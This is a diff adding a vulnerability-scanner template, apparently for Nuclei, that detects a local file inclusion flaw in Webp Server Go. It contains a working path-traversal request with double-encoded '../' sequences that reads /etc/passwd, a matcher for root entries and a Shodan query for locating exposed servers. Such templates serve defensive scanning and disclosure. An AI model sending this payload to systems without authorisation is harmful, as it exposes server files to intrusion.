@@ -1,0 +1,29 @@
+http:
+- matchers:
+  - regex:
+    - root:.*:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd'
+id: webp-server-go-lfi
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Webp server go is vulnerable to local file inclusion.
+  metadata:
+    max-request: 1
+    shodan-query: http.html:"Webp"
+    verified: true
+  name: Webp server go - Local File Inclusion
+  reference:
+  - https://github.com/webp-sh/webp_server_go/issues/92
+  severity: high
+  tags: lfi,webp
